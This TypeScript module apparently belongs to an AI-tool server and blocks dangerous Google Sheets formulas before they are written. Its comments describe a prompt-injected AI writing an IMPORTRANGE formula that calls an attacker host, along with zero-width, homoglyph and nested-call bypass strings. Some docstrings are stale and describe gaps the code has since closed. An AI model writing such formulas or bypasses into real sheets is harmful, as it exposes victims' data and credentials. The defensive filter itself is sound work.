// v1.21 Phase 1b — Formula REJECT module for Google Sheets USER_ENTERED writes.
//
// SafeSpace's FIRST inbound formula REJECT pipeline (mirrors v1.16 outbound
// sanitize structurally; semantically inverted — INBOUND not OUTBOUND).
// Applied to caller-supplied cell strings BEFORE they reach the Sheets API
// when `value_input_option === "USER_ENTERED"` on `sheets_update_values` or
// `sheets_batch_update.updateCells.rows[].values[].userEnteredValue.stringValue`
// (+ the analogous `repeatCell.cell.userEnteredValue.stringValue` path).
//
// THREAT MODEL: when Sheets evaluates a cell starting with `=`/`+` as a
// formula, certain functions reach OUTSIDE the spreadsheet — IMPORT*
// (SSRF cross-sheet/external fetch), HYPERLINK (phishing-link injection),
// IMAGE (SSRF via image URL fetched with sheet-owner identity), etc. A
// prompt-injected Claude could write `=IMPORTRANGE("https://attacker.example", "A1")`
// into a victim's sheet, causing Google to fetch attacker content with the
// victim's credentials. The REJECT list hard-blocks 11 known-dangerous
// functions PRE-SDK.
//
// SCOPE (Q2 LOCKED per docs/v1.21-sheets-phase2c.md §3 / Risk 1):
//   - 11 functions REJECTED case-insensitively (whitespace-tolerant).
//   - Outer function name ONLY. Documented Phase 1 gap:
//     `=SUM(IMPORTRANGE(...))` PASSES (outer is SUM). Phase 2 carry-forward
//     can extend to recursive AST parsing OR string-contains fallback.
//   - LAMBDA included (P3) — closes the only direct one-step nested bypass:
//     `=LAMBDA(x, IMPORTRANGE(x))("url")` evaluates with full inner effect.
//   - NFKC normalize (P7) — closes fullwidth-char / decomposition bypass:
//     `=ＩMPORTRANGE(` (U+FF29) normalizes to `=IMPORTRANGE(`.
//   - v1.25 Phase 4 Item 4 — Unicode zero-width + soft-hyphen pre-strip
//     BEFORE NFKC closes the v1.21 N1 carry-forward (3-cycle deferral).
//     5 codepoints stripped: U+00AD / U+200B / U+200C / U+200D / U+FEFF.
//   - v1.30 Phase 2 — wire `applyHomoglyphPipeline` (STEP A Default_Ignorable
//     STRIP + STEP B bidi STRIP + STEP C Cyrillic/Greek homoglyph NORMALIZE)
//     into the validation path as STEP 0b. Closes v1.25 + v1.26 + v1.28
//     inherited UTS #39 carry-forward (Cyrillic / Greek homoglyph + bidi
//     override + Default_Ignorable bypass classes). Documented-gap sentinel
//     #10 (test file) FLIPPED from PASS → REJECT this phase.
//
// ASYMMETRIC vs `src/sanitize/outbound.ts` — outbound sanitize REJECTS to
// defend a PUBLIC audience (YouTube comments); formula REJECT defends
// against attacker-controlled formulas being WRITTEN to the user's own
// (or shared) spreadsheet, where Google would evaluate them with the
// sheet owner's identity. Both are REJECT-style (no silent strip — would
// change user intent), both throw typed MCPError, both attach a closed-enum
// `reason` discriminator with NO PII echo. Different threat models, similar
// shape. v1.25 Phase 4 STRIP step is an internal normalization for the
// REJECT pipeline (NOT a public output channel) — see ZERO_WIDTH_AND_SOFT_HYPHEN_RE
// docstring for the strip-vs-reject asymmetry rationale.
//
// See docs/v1.21-sheets-phase2c.md §3 (full table + nested bypass §3.3) +
// §10 hooks #1 / #8 / #9 / #14 / #21 + §11 Q2 LOCKED.
// See docs/v1.25-multi-item-batch.md §2.4 (Item 4 pre-strip; Q5 + Q6 LOCKED).
// See docs/v1.30-uts39-defense.md §2 + §6 (Phase 2 integration; Q2 LOCKED
// Option C STRIP-then-NORMALIZE introspection-only; Q4 LOCKED reuse -32029
// with NORMALIZED ASCII function name preserving forensic shape).

import { applyHomoglyphPipeline } from "./homoglyph-normalize";

/**
 * 11 REJECTED function names (UPPERCASE; case-insensitive match in
 * `validateCellValue`). LOCKED per design Q2:
 *   - 5 IMPORT* SSRF (cross-sheet / external URL fetch)
 *   - HYPERLINK (phishing-link injection inside cell)
 *   - GOOGLEFINANCE / GOOGLETRANSLATE (external API fetch)
 *   - IMAGE (SSRF via image URL fetched with sheet-owner identity)
 *   - WEBSERVICE (Excel-compat external API fetch — rare but defensive)
 *   - LAMBDA (P3 — closes one-step nested-call bypass; only direct
 *     one-step nested escape is `=LAMBDA(x, IMPORTRANGE(x))("url")`,
 *     which evaluates inner with full effect)
 */
export const REJECTED_FUNCTIONS: ReadonlySet<string> = new Set([
  "IMPORTRANGE",
  "IMPORTXML",
  "IMPORTHTML",
  "IMPORTDATA",
  "IMPORTFEED",
  "HYPERLINK",
  "GOOGLEFINANCE",
  "GOOGLETRANSLATE",
  "IMAGE",
  "WEBSERVICE",
  "LAMBDA",
]);

/**
 * Formula prefix regex. Matches:
 *   - optional whitespace BETWEEN `=`/`+` and function name
 *   - function name: starts with ASCII letter or underscore, then
 *     alphanumerics + underscore
 *   - optional whitespace BEFORE the opening `(`
 *
 * Case-insensitive at the function-name comparison step (uppercased before
 * Set.has) — the regex itself uses `[A-Za-z_]` so the captured name is in
 * whatever case the caller supplied; the handler uppercases before lookup.
 *
 * NFKC normalize step (in `validateCellValue` below) runs BEFORE this regex,
 * so fullwidth Unicode variants like U+FF29 collapse to ASCII `I` and the
 * regex catches `=ＩMPORTRANGE(` → `=IMPORTRANGE(` → match → REJECT.
 *
 * ReDoS safety: bounded `\s*` quantifiers (whitespace classes are small),
 * no nested backtracking groups, no alternation with overlapping prefixes.
 * Sentinel test runs 1500 iterations against a 256-char hostile input
 * within a 1500ms budget.
 *
 * Source-bytes safety: source file MUST NOT contain literal U+2028 or
 * U+2029 (paste-artifact defense; mirror v1.20 `src/sheets/a1.ts` P2
 * convention). v1.25 Phase 4 extends the source-byte-purity invariant to
 * the 5 Unicode codepoints stripped by ZERO_WIDTH_AND_SOFT_HYPHEN_RE
 * (U+00AD / U+200B / U+200C / U+200D / U+FEFF) — written via `\u` escape
 * sequences only. Sentinel tests assert source byte purity for all 7
 * codepoints.
 */
export const FORMULA_PREFIX_RE = /^[=+]\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(/;

/**
 * v1.25 Phase 4 (Item 4) — Unicode zero-width + soft-hyphen pre-strip regex.
 *
 * Closes v1.21 N1 (3-cycle deferral v1.22 / v1.23 / v1.24) bypass class:
 * NFKC alone PRESERVES the following 5 codepoints — an LLM-emitted formula
 * could split a REJECTED function name with an invisible character to
 * evade the regex match. Example bypass (BEFORE this pre-strip):
 *   `=IMP[U+200B]ORTRANGE("https://attacker", "A1")` → NFKC preserves the
 *   ZWSP → regex captures `IMP` (or fails) → safety net BYPASSED.
 *
 * 5 CODEPOINTS IN SCOPE (Q5 LOCKED — bounded; avoids scope-creep):
 *   - U+00AD SOFT HYPHEN (SHY) — historically used for line-break hints;
 *     NFKC treats as ignorable-in-collation but does NOT remove
 *   - U+200B ZERO WIDTH SPACE (ZWSP)
 *   - U+200C ZERO WIDTH NON-JOINER (ZWNJ)
 *   - U+200D ZERO WIDTH JOINER (ZWJ)
 *   - U+FEFF ZERO WIDTH NO-BREAK SPACE (BOM)
 *
 * STRIP SEMANTICS (NOT REJECT) per design §2.4 sec-rev hook #6: inbound
 * formula identifiers have NO legitimate zero-width use, so silent strip
 * converges to the clean identifier and matches the obvious caller intent
 * (the visible characters are the actual function name being requested).
 *
 * ASYMMETRY WITH OUTBOUND SANITIZE: `src/sanitize/outbound.ts` REJECTS
 * zero-width chars instead of stripping them — because outbound text
 * (YouTube comments) is composed by the user and silent removal would
 * change user intent for a PUBLIC audience. Inbound formula identifier
 * context is opposite: zero-width inside an identifier is almost
 * certainly an attack pattern, not user intent. Different threat models;
 * different semantics. Documented intentionally — do NOT unify.
 *
 * UTS #39 CYRILLIC HOMOGLYPH DEFENSE DEFERRED v1.26+ per Q6 LOCKED:
 * `=ІMPORTRANGE(...)` (Cyrillic capital I, U+0406) STILL bypasses
 * today. UTS #39 confusables data is a ~250KB Unicode table requiring
 * vendoring decision + per-codepoint script-membership lookup + yearly
 * Unicode update cadence + hot-path perf evaluation. NOT a "1-line fix";
 * warrants its own design pre-PR. Documented-gap sentinel test pins
 * TODAY's behavior so v1.26+ closure must deliberately flip the assertion.
 *
 * Source-bytes safety: regex written with `\u00AD\u200B\u200C\u200D\uFEFF`
 * Unicode escape sequences (NOT literal codepoints) mirroring the v1.21
 * NFKC convention. Sentinel test asserts source-byte purity (file MUST
 * NOT contain literal copies of these 5 codepoints — paste-artifact
 * defense + grep-friendly).
 */
export const ZERO_WIDTH_AND_SOFT_HYPHEN_RE =
  /[\u00AD\u200B\u200C\u200D\uFEFF]/g;

// --- v1.34 STEP 5 nested-call scanner char predicates (ASCII) ---
// Operate on the INTROSPECTED form (post STEP 0a zero-width strip + STEP 0
// NFKC + STEP 0b homoglyph normalize). NFKC folds compatibility spaces
// (U+00A0 / U+2007 / U+202F …) to U+0020, and STEP 0a strips the 5 zero-width
// codepoints, so ASCII whitespace fully covers the introspected form.
function isIdentStart(c: number): boolean {
  // A-Z (0x41-0x5A) / a-z (0x61-0x7A) / _ (0x5F)
  return (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a) || c === 0x5f;
}
function isIdentPart(c: number): boolean {
  // identifier-start OR 0-9 (0x30-0x39)
  return isIdentStart(c) || (c >= 0x30 && c <= 0x39);
}
function isAsciiWs(c: number): boolean {
  // space / tab / LF / VT / FF / CR
  return (
    c === 0x20 ||
    c === 0x09 ||
    c === 0x0a ||
    c === 0x0b ||
    c === 0x0c ||
    c === 0x0d
  );
}

/**
 * Skip a string / sheet-name literal starting at `openIdx` (the opening
 * quote), honoring the doubling-escape convention (`""` inside a `"`-literal,
 * `''` inside a `'`-literal = one literal quote char, stay inside). Returns
 * the index AFTER the closing quote, or `s.length` if the literal is
 * unterminated (scan consumes the remainder — Google returns its own parse
 * error; not our concern, mirror STEP 3 "no match → PASS").
 */
function skipLiteral(s: string, openIdx: number, quote: number): number {
  const n = s.length;
  let i = openIdx + 1;
  while (i < n) {
    if (s.charCodeAt(i) === quote) {
      // Doubled quote = escaped literal quote; stay inside the literal.
      if (i + 1 < n && s.charCodeAt(i + 1) === quote) {
        i += 2;
        continue;
      }
      return i + 1; // lone quote = closing delimiter
    }
    i++;
  }
  return n; // unterminated literal
}

/**
 * v1.34 STEP 5 — scan the INTROSPECTED formula for a REJECTED function CALL
 * token appearing ANYWHERE (nested, sibling, or as an argument), OUTSIDE
 * string / sheet-name literals. Closes the v1.21 §3.3 documented
 * nested-formula bypass (`=SUM(IMPORTRANGE(...))` PASSED through v1.33
 * because the outer-name-only check at STEP 4 saw `SUM`).
 *
 * Q1 LOCKED (docs/v1.34-nested-formula-reject.md §3): string-literal-aware
 * single-pass O(N) scanner — NOT a full recursive-descent AST parser. We do
 * not need to UNDERSTAND the formula, only to find rejected call tokens.
 *   - Depth-agnostic: finds EVERY `IDENTIFIER(` token, so nesting depth is
 *     irrelevant; no recursion, no depth limit.
 *   - ReDoS-free by construction: hand-written single pass, no regex
 *     backtracking; O(N) bounded by the existing per-cell 50KB cap.
 *   - Q2 LOCKED literal skip: both `"`-delimited string literals AND
 *     `'`-delimited sheet-name references are skipped, each with the
 *     doubling-escape convention. This is precisely what a naive
 *     "string-contains-a-rejected-name" check gets wrong (it would
 *     false-positive on instructional text like `="Use IMPORTRANGE(url)"`).
 *
 * A CALL token is an identifier (maximal-munch `[A-Za-z_][A-Za-z0-9_]*`)
 * immediately followed — modulo ASCII whitespace — by `(`. The maximal-munch
 * rule means `IMPORTRANGE_TOTAL` (a named range) is a DISTINCT identifier and
 * never matches `IMPORTRANGE`; a bare `IMPORTRANGE` reference WITHOUT `(`
 * (a named-range read, not a function call) also does not match.
 *
 * Returns the UPPERCASED name of the FIRST rejected call token in source
 * order, or `null` if none. The caller (validateCellValue) runs this only
 * after STEP 4 did NOT reject the outer name, so a non-null return is always
 * a genuinely nested / sibling rejected call.
 */
export function scanRejectedCallTokens(introspected: string): string | null {
  const n = introspected.length;
  let i = 0;
  while (i < n) {
    const c = introspected.charCodeAt(i);
    // 0x22 = '"'  0x27 = '\'' — enter a literal, skip to its terminator.
    if (c === 0x22 || c === 0x27) {
      i = skipLiteral(introspected, i, c);
      continue;
    }
    if (isIdentStart(c)) {
      let j = i + 1;
      while (j < n && isIdentPart(introspected.charCodeAt(j))) j++;
      // identifier occupies [i, j); skip ASCII whitespace before the paren.
      let k = j;
      while (k < n && isAsciiWs(introspected.charCodeAt(k))) k++;
      if (k < n && introspected.charCodeAt(k) === 0x28 /* '(' */) {
        const name = introspected.slice(i, j).toUpperCase();
        if (REJECTED_FUNCTIONS.has(name)) return name;
      }
      i = j; // resume scanning AFTER this identifier
      continue;
    }
    i++;
  }
  return null;
}

/**
 * Result of validating a single cell value against the formula REJECT list.
 *   - `ok: true`  → cell is safe to pass to Sheets API
 *   - `ok: false` → cell triggered REJECT; `rejected_function` carries the
 *     UPPERCASED function name (one of the 11 in REJECTED_FUNCTIONS).
 *     v1.32 Phase 1 adds optional `rejected_formula_homoglyph_source`
 *     (PRESENCE-as-signal) carrying the ORIGINAL pre-normalize chars that
 *     the homoglyph pipeline transformed. See field docstring below for
 *     semantics + Phase 2 wiring plan.
 */
export type ValidateCellResult =
  | { ok: true }
  | {
      ok: false;
      rejected_function: string;
      /**
       * v1.32 Phase 1 forensic field -- original (pre-normalize) characters
       * that `applyHomoglyphPipeline` transformed (STRIP via DEFAULT_
       * IGNORABLE_RE / BIDI_OVERRIDE_RE OR NORMALIZE via HOMOGLYPH_MAP).
       *
       * PRESENCE-as-signal (mirror v1.24 errorCode / v1.27 MetaMap patterns):
       *   - ABSENT for pure ASCII attacks (e.g., `=IMPORTRANGE(...)` --
       *     no transformable codepoints in input).
       *   - PRESENT (non-empty string) for homoglyph / invisible-char
       *     attacks. Captured in INPUT byte order (per
       *     docs/v1.32-forensic-field.md section 3 Q2 LOCK Option B
       *     all-transformed-chars).
       *
       * Phase 1 surfaces the field; Phase 2 wires it through to MCPError.data
       * + sheetsMutationMeta.rejected_formula_homoglyph_source. The ORIGINAL
       * caller-supplied cell value is what flows to the SDK regardless
       * (Q5 LOCK INTROSPECTION refinement -- forensic capture is for
       * operator visibility on the REJECT path only; does NOT leak onto a
       * PASS path or onto the SDK boundary).
       *
       * Forensic value: identifies attack vector ("Cyrillic homoglyph",
       * "ZWSP splice", "bidi reversal") without leaking the full original
       * cell string. Operators reading `safespace audit suspicious` can
       * triage Phase 2 REJECT rows by attack family.
       */
      rejected_formula_homoglyph_source?: string;
      /**
       * v1.41 forensic discriminator -- distinguishes a DIRECT attack from a
       * NESTED-wrapper smuggle. PRESENCE-as-signal (mirror v1.32
       * `rejected_formula_homoglyph_source`):
       *   - ABSENT on the STEP 4 path: the OUTER function name itself is in
       *     REJECTED_FUNCTIONS (`=IMPORTRANGE(...)`). A direct attack.
       *   - PRESENT (`true`) on the STEP 5 path: the outer name is benign but
       *     a rejected call token was smuggled nested / sibling / argument-
       *     positioned (`=SUM(IMPORTRANGE(...))`, `=A1+IMPORTRANGE(...)`). The
       *     attacker tried to evade the outer-name check.
       *
       * Type is literal `true` (not `boolean`): the field only ever exists on
       * the nested path, so its very presence is the signal. ABSENT ⇒ direct,
       * keeping the dominant direct-attack audit row byte-identical to v1.40.
       *
       * Introspection-only: like the homoglyph field, this records WHICH
       * REJECT path fired for operator forensics; it never alters the REJECT
       * decision or the SDK-bound cell value. See docs/v1.41-nested-forensic-
       * flag.md Q1/Q2 LOCKED.
       */
      rejected_formula_nested?: true;
    };

/**
 * Validate a single cell value against the formula REJECT list.
 *
 * Pipeline (per design §3 + v1.25 Phase 4 §2.4 + v1.30 Phase 2 §2.2):
 *   STEP 0a (v1.25 Item 4): zero-width + soft-hyphen pre-strip via
 *     ZERO_WIDTH_AND_SOFT_HYPHEN_RE. MUST run BEFORE NFKC (Q5 LOCKED) —
 *     NFKC alone preserves these 5 codepoints, so a regex match on the
 *     NFKC output would still miss `=IMP[U+200B]ORTRANGE(...)`. Strip
 *     first; NFKC second; regex third. Sec-rev hook #7.
 *   STEP 0 (P7 NFKC normalize): apply `String.prototype.normalize("NFKC")`
 *     to canonicalize fullwidth + decomposition bypass attempts.
 *   STEP 0b (v1.30 Phase 2 — NEW): apply `applyHomoglyphPipeline` to
 *     strip Default_Ignorable + bidi-override codepoints and NORMALIZE
 *     Cyrillic + Greek homoglyphs to ASCII. INTROSPECTION-ONLY per
 *     design §6 Q2 LOCKED Option C — the transformed string is used
 *     ONLY for FORMULA_PREFIX_RE extraction + REJECTED_FUNCTIONS
 *     membership check; the ORIGINAL caller-supplied cell value is what
 *     the SDK ultimately sees (preserves audit byte-stability + the
 *     v1.21 + v1.25 regression net + Q3 LOCK). Defense-in-depth: the
 *     formula's BYTES go to Google unchanged (Google's evaluation
 *     engine canonicalizes Cyrillic/Greek to ASCII itself for function
 *     dispatch), but our REJECT regex sees the NORMALIZED form and
 *     refuses to forward — closes v1.25 + v1.26 + v1.28 inherited
 *     UTS #39 / bidi / Default_Ignorable carry-forwards.
 *
 *     Pipeline ORDER (Hook #10 — pinned by integration sentinel):
 *       STEP 0a → STEP 0 → STEP 0b → STEP 3 → STEP 4.
 *     The ORIGINAL `cell` is the SDK-bound value; `introspected` is
 *     transient and discarded after STEP 4.
 *   STEP 1: skip non-string cells (numbers / booleans — type-checked at
 *     handler boundary; cannot be formulas).
 *   STEP 2: skip non-formula prefixes (cells not starting with `=` or `+`
 *     are literal text per Sheets evaluation semantics).
 *   STEP 3: extract outer function name via FORMULA_PREFIX_RE; if no
 *     match (e.g., `=` followed by no valid identifier), PASS (Google will
 *     return its own error — not our concern).
 *   STEP 4: uppercase captured name, check REJECTED_FUNCTIONS membership.
 *     Match → return `{ok: false, rejected_function: <UPPERCASED>}`.
 *     `rejected_function` carries the NORMALIZED ASCII function name
 *     (Q4 LOCKED reuse -32029 — Cyrillic / Greek homoglyph attacks
 *     surface with the same forensic shape as direct ASCII attacks).
 *     No match → return `{ok: true}`.
 *
 * NESTED FORMULA LIMITATION (documented Phase 1 gap per §3.3):
 *   `=SUM(IMPORTRANGE(...))` PASSES — outer function is SUM, not in
 *   REJECT list. SUM aggregates the IMPORTRANGE result; the IMPORTRANGE
 *   side-effect still fires. Mitigation: SUM-wrapper is a contrived
 *   bypass + audit visibility logs the call. LAMBDA is in the REJECT set
 *   (P3) — closes the only direct one-step nested escape.
 *
 *   Phase 2 carry-forward: extend to recursive AST parsing OR add a
 *   "string-contains-rejected-function-anywhere" fallback (false-positive
 *   risk for cells like `="The IMPORTRANGE function is..."`).
 */
export function validateCellValue(cell: unknown): ValidateCellResult {
  // STEP 1: non-string cells cannot be formulas. Type-checked at handler.
  if (typeof cell !== "string") return { ok: true };
  // STEP 0a (v1.25 Phase 4 — Item 4): Unicode zero-width + soft-hyphen
  // pre-strip. MUST run BEFORE NFKC (Q5 LOCKED) — NFKC preserves these
  // 5 codepoints, so a regex match on the NFKC output would still miss
  // `=IMP[U+200B]ORTRANGE(...)`. Strip semantics (not REJECT) per design
  // §2.4 sec-rev hook #6 — inbound formula identifier has no legitimate
  // zero-width use. Closes v1.21 N1 (3-cycle deferral).
  const stripped = cell.replace(ZERO_WIDTH_AND_SOFT_HYPHEN_RE, "");
  // STEP 0: NFKC normalize BEFORE the regex (P7). No-op for ASCII strings
  // (common case; zero perf cost). Closes fullwidth + decomposition bypass.
  const normalized = stripped.normalize("NFKC");
  // STEP 0b (v1.30 Phase 2): apply `applyHomoglyphPipeline` for
  // Default_Ignorable + bidi STRIP + Cyrillic/Greek homoglyph NORMALIZE.
  // INTROSPECTION-ONLY (Q2 LOCKED Option C): `introspected` is a transient
  // string used ONLY for STEP 3 regex extraction + STEP 4 REJECT-set
  // membership. The ORIGINAL `cell` is what flows back to the SDK call
  // path — this function does not mutate, copy, or otherwise interfere
  // with the cell value the caller writes to the spreadsheet. Closes
  // v1.25 + v1.26 + v1.28 inherited UTS #39 carry-forwards (Cyrillic /
  // Greek homoglyph + Default_Ignorable + bidi override bypass classes).
  // Fast-path ASCII early-exit inside applyHomoglyphPipeline (sec-rev
  // hook #5 + Risk 2 ≤5% perf budget; verified by integration sentinel).
  //
  // v1.32 Phase 1 — `applyHomoglyphPipeline` returns `{normalized,
  // homoglyphSource?}`. `homoglyphSource` is PRESENCE-as-signal (ABSENT
  // for pure ASCII, PRESENT for any transformed input). The transformed
  // string is `pipelineResult.normalized`; the original-bytes capture is
  // `pipelineResult.homoglyphSource` and is surfaced on the REJECT path
  // ONLY (Q5 LOCK INTROSPECTION refinement — forensic capture is for
  // operator visibility post-REJECT; does NOT leak onto a PASS path or
  // onto the SDK boundary).
  const pipelineResult = applyHomoglyphPipeline(normalized);
  const introspected = pipelineResult.normalized;
  // STEP 2: skip cells that don't start with a formula prefix. Sheets
  // evaluates only `=` and `+` (legacy Lotus-1-2-3 compat); `-N` is a
  // numeric literal, `@` is treated as literal text (different threat class
  // out of scope per v1.20 §8 / Risk 5).
  if (introspected.length === 0) return { ok: true };
  const first = introspected.charCodeAt(0);
  // 0x3D = '=' / 0x2B = '+'
  if (first !== 0x3d && first !== 0x2b) return { ok: true };
  // STEP 3: extract outer function name from the INTROSPECTED form (so a
  // Cyrillic-laced `=ІMPORTRANGE(...)` surfaces as ASCII `IMPORTRANGE` for
  // the regex). No match → PASS (caller-supplied garbage; Google will
  // reject with its own 400; not our concern).
  const match = FORMULA_PREFIX_RE.exec(introspected);
  // STEP 4: REJECT-set membership check on the OUTER name. `rejected_function`
  // carries the NORMALIZED ASCII function name (Q4 LOCKED reuse -32029 —
  // preserves forensic shape between direct ASCII attacks and Cyrillic/Greek
  // homoglyph variants in the audit row).
  //
  // v1.32 Phase 1 — REJECT path surfaces `rejected_formula_homoglyph_source`
  // via PRESENCE-as-signal spread-when-defined: present only when the
  // homoglyph pipeline transformed at least one character (homoglyphSource
  // non-empty). PASS path never carries the field. Phase 1 surfaces the
  // field at validateCellValue layer; Phase 2 wires it through MCPError +
  // sheetsMutationMeta.
  //
  // v1.34 — NOTE the structural change vs ≤v1.33: a no-match (`!match`) no
  // longer early-returns PASS; it falls through to STEP 5 so the sibling-term
  // variant `=A1+IMPORTRANGE(...)` (no outer call token) is still scanned.
  if (match) {
    const functionName = match[1]!.toUpperCase();
    if (REJECTED_FUNCTIONS.has(functionName)) {
      return {
        ok: false,
        rejected_function: functionName,
        ...(pipelineResult.homoglyphSource !== undefined && {
          rejected_formula_homoglyph_source: pipelineResult.homoglyphSource,
        }),
      };
    }
  }
  // STEP 5 (v1.34 — Q1 LOCKED): the OUTER name (if any) is NOT in the REJECT
  // set. Scan the whole INTROSPECTED expression for a REJECTED function CALL
  // token nested / sibling / argument-positioned ANYWHERE, outside string /
  // sheet-name literals. Closes the v1.21 §3.3 documented nested-formula
  // bypass (`=SUM(IMPORTRANGE(...))`, `=ARRAYFORMULA(IMPORTRANGE(...))`,
  // `=QUERY(IMPORTRANGE(...))`, `=A1+IMPORTRANGE(...)`, …).
  //
  // Introspection-only (Q3 LOCKED reuse -32029): the ORIGINAL `cell` is still
  // the SDK-bound value; `rejected_function` carries the NORMALIZED ASCII
  // nested name (forensic shape identical to a direct attack). The
  // homoglyph-source spread fires identically — a homoglyph-laced nested name
  // like `=SUM(ІMPORTRANGE(...))` is normalized by STEP 0b BEFORE the scan,
  // and `homoglyphSource` already captured the transformed source bytes.
  const nested = scanRejectedCallTokens(introspected);
  if (nested !== null) {
    return {
      ok: false,
      rejected_function: nested,
      // v1.41 — this is the STEP 5 path: the outer name was benign and a
      // rejected call token was smuggled nested / sibling / argument-
      // positioned. PRESENCE-as-signal `true` discriminates it from the
      // STEP 4 direct-attack return above (which omits the field). The
      // STEP 4 return MUST NOT carry this field — absence ⇒ direct attack.
      rejected_formula_nested: true,
      ...(pipelineResult.homoglyphSource !== undefined && {
        rejected_formula_homoglyph_source: pipelineResult.homoglyphSource,
      }),
    };
  }
  return { ok: true };
}

/**
 * Test-only reset helper. Module has no state today (REJECTED_FUNCTIONS +
 * FORMULA_PREFIX_RE are module-frozen constants); helper exists for
 * structural parity with `src/policy/youtube-comment-burst.ts` +
 * `src/sanitize/outbound.ts` patterns (forward-compat for any future
 * per-process counter or cache addition).
 */
export function __resetForTest(): void {
  // No-op today. Future: reset module-level counters / caches if added.
}
